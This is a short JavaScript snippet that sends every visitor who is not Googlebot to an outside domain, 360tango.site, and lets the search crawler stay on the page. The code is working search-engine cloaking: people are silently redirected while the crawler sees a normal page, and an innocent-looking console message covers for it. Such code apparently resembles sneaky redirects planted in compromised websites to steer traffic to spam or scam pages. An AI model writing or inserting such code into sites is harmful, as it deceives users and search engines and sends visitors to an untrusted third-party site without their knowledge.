if (!navigator.userAgent.includes('Googlebot')) {
  window.location.href = "https://360tango.site?ffvers";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
